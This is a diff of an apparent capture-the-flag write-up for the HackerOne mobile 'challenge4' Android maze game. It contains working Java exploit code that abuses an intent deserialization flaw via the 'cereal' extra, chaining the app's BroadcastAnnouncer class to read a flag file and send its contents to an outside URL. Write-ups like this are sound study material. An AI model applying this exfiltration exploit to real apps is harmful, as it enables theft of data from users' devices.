@@ -174,4 +174,158 @@ testIntent.putExtra("start_game", true);
 sendBroadcast(testIntent);
 ```
 
-You can test this works if the application navigates to the start of the game. In my case it worked. Now we can test another basic intent works by calling get_maze. We first need to register a receiver to get the responses.
+You can test this works if the application navigates to the start of the game. In my case it worked. Now we can test another basic intent works by calling get_maze. We first need to register a receiver to get the responses. Here's my code:
+
+```
+        Log.d("MYAPP", "Registering intent");
+        br = new ReceiveResponse();
+        this.registerReceiver(br,
+                new IntentFilter("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER"));
+
+        final Handler handler = new Handler();
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                Log.d("MYAPP", "Sending intent");
+                Intent secondIntent = new Intent("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER");
+                secondIntent.putExtra("get_maze", true);
+                sendBroadcast(secondIntent);
+            }
+        }, 2000);
+```
+
+Your intent will then receive the Maze as well as an array containing the locations of the player and the goal. I noticed that there is a `move` extra which we can send. It takes one of the following chars `hjkl` which look to me to be similar to the keys that can be used to navigate certain text editors, where `k` is up, `j` is down, and so on.
+
+Now, we know the vulnerability is an arbitrary Java object deserialization, and that we can send broadcasts to this thing. Now we need to identify the individual exploit. There is a very suspect component within the target `APK` which is the apache commons codec library. Now, looking online I could not find any reported vulnerabilities for this component, and I assume that the staff here don't want an 0day.
+
+Rather, I focused on what I may have missed, and came across the `BroadcastAnnouncer.java` file, which contains the following class:
+
+```
+public class BroadcastAnnouncer extends StateController implements Serializable
+{
+[...]
+    
+    public BroadcastAnnouncer(final String s, final String stringRef, final String destUrl) {
+        super(s);
+        this.stringRef = stringRef;
+        this.destUrl = destUrl;
+    }
+    
+ [...]
+    public Object load(final Context context) {
+        this.stringVal = "";
+        final File file = new File(this.stringRef);
+        try {
+            final BufferedReader bufferedReader = new BufferedReader(new FileReader(file));
+            while (true) {
+                final String line = bufferedReader.readLine();
+                if (line == null) {
+                    break;
+                }
+                final StringBuilder sb = new StringBuilder();
+                sb.append(this.stringVal);
+                sb.append(line);
+                this.stringVal = sb.toString();
+            }
+[...]
+    }
+    
+    public void save(final Context context, final Object o) {
+        new Thread() {
+            @Override
+            public void run() {
+                try {
+                    final StringBuilder sb = new StringBuilder();
+                    sb.append(BroadcastAnnouncer.this.destUrl);
+                    sb.append("/announce?val=");
+                    sb.append(BroadcastAnnouncer.this.stringVal);
+                    final HttpURLConnection httpURLConnection = (HttpURLConnection)new URL(sb.toString()).openConnection();
+                    try {
+                        new BufferedInputStream(httpURLConnection.getInputStream()).read();
+```
+
+If we can instantiate this class, and get the code to call the `load` and `save` methods on it, we can obtain the flag without obtaining arbitrary code execution. The `cereal` parameter takes a GameState, which has a `stateController` attribute. Coincidentally, it calls the `load` method during initialization, and `save` during the destruction of the object, but only if we have solved more than two levels.
+
+With that in mind, we need to write a [Maze-Solving algorithm](https://en.wikipedia.org/wiki/Maze_solving_algorithm). There are various implementations online but this game's controls are kind of unique in some ways and so I had to write my own. I thought of writing a really complex solution that would solve all mazes but I was afraid of skynet taking over the world so I opted for a simpler solution that would not involve the catastrophic destruction of mankind. My algorithm is roughly like this:
+
+1. Is there a wall in this specific direction? If there is, choose another direction.
+2. Have I literally just come from there? If so, choose another direction.
+3. Otherwise, move there.
+
+It works OK for levels one, two and three, which is all we need. If you're curious, the code looks like this:
+
+```
+private void decideMove(Context context, int currX, int currY, boolean lastDitch) {
+debugMap(currX, currY);
+boolean canMoveLeft = walls[currY][currX - 1] && (!(lastMove == Direction.RIGHT) || lastDitch) ;
+Log.d("MAZE", String.format("canMoveLeft %b, move to coords: %d/%d val %b", canMoveLeft, currX - 1,
+        currY, walls[currY][currX - 1]));
+if(canMoveLeft) {
+    moveLeft(context);
+    return;
+}
+
+boolean canMoveUp = walls[currY - 1][currX] && (!(lastMove == Direction.DOWN) || lastDitch);
+Log.d("MAZE", String.format("canMoveUp %b, move to coords: %d/%d val %b", canMoveUp, currX,
+        currY - 1, walls[currY - 1][currX]));
+if(canMoveUp) {
+    moveUp(context);
+    return;
+}
+
+boolean canMoveRight = walls[currY][currX + 1] && (!(lastMove == Direction.LEFT) || lastDitch);
+Log.d("MAZE", String.format("canMoveRight %b, move to coords: %d/%d val %b", canMoveRight, currX + 1,
+        currY, walls[currY][currX + 1]));
+if(canMoveRight) {
+    moveRight(context);
+    return;
+}
+
+boolean canMoveDown = walls[currY + 1][currX]  && (!(lastMove == Direction.UP) || lastDitch);
+Log.d("MAZE", String.format("canMoveDown %b, move to coords: %d/%d val %b", canMoveDown, currX,
+        currY + 1, walls[currY + 1][currX]));
+if(canMoveDown) {
+    moveDown(context);
+    return;
+}
+
+if(lastDitch) {
+    Log.e("MAZE", "No possible moves left.");
+} else {
+    decideMove(context, currX, currY, true);
+}
+}
+```
+
+The maze solving algorithm, while rudimentary manages to get to the required level. I detect which level we're currently at by monitoring the width of the maze, and run the exploit:
+
+```
+        if(walls != null) {
+            Log.d("MAZE", String.format("Maze size: %d", walls[0].length));
+            if (walls[0].length > 15) {
+                exploit(context);
+            }
+        }
+        
+        [...]
+        
+    private void exploit(Context context) {
+        String path = "/data/local/tmp/challenge4";
+
+        StateController stateController = new BroadcastAnnouncer("MazeGame", path, "http://www.mywebsite.com/");
+        GameState gameState = new GameState("", stateController);
+
+        Intent exploitIntent = new Intent();
+        exploitIntent.setAction("com.hackerone.mobile.challenge4.broadcast.MAZE_MOVER");
+        Bundle bundle = new Bundle();
+
+
+        try {
+            bundle.putSerializable("cereal", gameState);
+        } catch(Exception e) {}
+
+        exploitIntent.putExtras(bundle);
+        context.sendBroadcast(exploitIntent);
+    }
+```
+
